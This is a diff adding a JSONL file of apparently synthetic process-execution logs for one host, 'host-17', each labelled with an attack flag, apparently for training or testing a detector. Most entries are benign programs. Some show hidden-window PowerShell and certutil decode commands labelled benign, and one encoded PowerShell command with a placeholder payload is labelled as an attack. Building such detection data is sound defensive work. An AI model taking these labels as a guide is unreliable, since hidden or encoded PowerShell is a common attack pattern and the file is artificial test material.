@@ -1,0 +1,994 @@
+{"@timestamp": "2025-06-05T14:43:11.813344", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:16:02.983734", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:46:25.910633", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T00:15:26.923576", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:22:02.892423", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:06:32.172468", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T15:46:38.665032", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:55:50.600219", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:58:37.403361", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:47:35.312112", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:54:10.531176", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:32:08.688164", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:02:21.785945", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:22:25.027201", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:15:54.754463", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:32:54.382271", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:04:02.650740", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:35:18.587011", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:23:15.663401", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:45:18.691881", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:38:48.479164", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:51:16.664981", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:15:52.892469", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:03:04.663433", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:08:37.473577", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:38:34.494958", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T18:49:51.191836", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:09:45.439176", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:54:29.222512", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:00:25.617348", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:06:37.973865", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:58:18.880951", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:46:14.603424", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:49:03.171143", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:30:23.314245", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:50:45.033221", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:08:15.969767", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:14:00.774799", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:47:45.368070", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:49:11.391297", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:51:04.657199", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:35:52.196477", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:33:17.730800", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:56:47.057129", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:40:24.866575", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T20:10:42.076914", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:07:35.306790", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:03:32.393744", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:01:11.448643", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T03:02:25.542706", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T14:20:59.678539", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:51:01.197341", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:02:44.568352", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:05:23.811948", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:11:13.406930", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:19:56.647252", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:44:58.983765", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:42:10.074207", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T17:34:12.082447", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:52:17.675698", "host": "host-17", "process": "powershell.exe", "args": "-enc <base64>", "attack": true}
+{"@timestamp": "2025-06-05T16:27:31.637657", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:07:44.203032", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:06.278408", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T17:51:11.819644", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:13:27.682323", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:57:03.749364", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:24:20.592277", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:13:39.277568", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:23:24.644315", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T09:36:29.836567", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:47:48.040732", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:27:01.904069", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:08:44.580515", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:25:02.006860", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:58:04.120316", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:26:21.393142", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T14:03:32.052052", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:32:19.856488", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:57:53.820364", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T22:32:47.327487", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:28:55.922285", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T07:34:47.558462", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:23:06.460157", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:42:02.459449", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:39:19.140696", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:32:24.893921", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:07:06.369586", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:40:45.249372", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:16:18.037668", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:42:57.328318", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:20:20.857407", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:04:08.370477", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:36:25.402095", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:40:40.890049", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T02:21:11.184281", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:20:52.241286", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:22:59.358585", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:15:17.006368", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:57:19.024843", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:26:19.993046", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:02:05.123388", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:10:22.660623", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:24:07.720441", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:08:15.957450", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T14:54:23.930997", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:46:42.646253", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:50:33.598821", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:06:37.724055", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T10:06:01.625266", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:36:34.985330", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:40:49.083372", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:52:38.909044", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:18:48.960023", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:41:46.227786", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:26:00.834064", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:31:55.216542", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T17:11:31.928827", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:42:23.717231", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T15:36:59.879939", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:31:33.384968", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T21:36:23.033506", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:49:39.100796", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:27:58.008757", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:44:13.027072", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:07:35.910784", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:46:42.795022", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:58:08.812621", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:02:49.408676", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:13:49.399892", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:18:13.889276", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:46:02.434228", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:50:10.605655", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:07:29.117142", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:10:22.557250", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:03:26.588370", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T19:22:54.567078", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:45:27.224811", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:43:01.855969", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T21:31:28.707400", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:58:27.887855", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:48:05.589576", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:09:52.331127", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:09:21.370987", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:11:09.773114", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:48:32.151767", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:13:25.237785", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:47:42.533473", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:12:26.377558", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:23:54.138394", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:41:53.562706", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:05:41.102072", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:20:32.971224", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:29:38.394681", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:34:31.819051", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:20:30.396209", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:07:09.418274", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T10:52:09.206720", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:46:20.572259", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:14:15.527200", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:19:30.473982", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:36:51.384746", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:24:42.104755", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:17:11.865280", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:13:26.556386", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:44:44.916413", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:40:01.957497", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:58:19.568973", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:19:42.707790", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:07:12.143070", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:27:47.728263", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:09:43.083603", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:07:52.675240", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:06:24.468962", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:11:52.148888", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:22:57.655864", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:15:32.939791", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:12:53.193196", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:37:16.605456", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:58:50.032679", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:55:07.886417", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:56:23.489391", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:26:18.454261", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:31:09.878164", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:35:44.833655", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:08:39.761663", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T01:57:54.926639", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:59:32.099778", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:12:38.197401", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T04:03:01.419578", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:04:30.155496", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:44:31.431083", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:18:23.332194", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:32:49.987112", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:31:01.617385", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T05:08:21.370657", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:56:56.817049", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:30:37.526318", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:38:31.831603", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:21:29.599932", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:26:59.015685", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:28:08.327681", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T13:14:39.251159", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:09:02.621814", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:29:11.376393", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:28:32.478989", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:00:51.083598", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:57:16.117239", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:13:05.945953", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:31:08.841202", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:04:16.245048", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:22:57.243439", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:40:35.207664", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:27:07.237157", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:31:12.273769", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:01:30.215163", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:39:27.171763", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:18:06.094785", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:30:18.947533", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:17:42.622249", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:17:00.668823", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:30:28.656119", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:44:07.429630", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:57:42.995386", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:12:08.130081", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:37:09.659349", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:41:00.678737", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T23:16:31.376783", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:57:16.914121", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:09:45.649090", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T14:11:36.278246", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:56:43.041306", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:56:55.817385", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:54:32.701453", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:03:50.703687", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:25:29.748284", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:39:06.975520", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:11:37.399936", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:53:21.866955", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:58:49.301731", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:16:34.764650", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:07:09.370858", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:34:46.564942", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:51:53.688492", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:06:04.138902", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:58:00.387982", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:16:36.444878", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T05:46:57.599511", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:42:14.555302", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:14:39.198339", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:26:34.550796", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:38:24.131127", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:53:52.486396", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:36:32.553889", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:03:22.921122", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T15:59:51.158247", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:55:23.910480", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:06:48.619423", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:21:01.898782", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
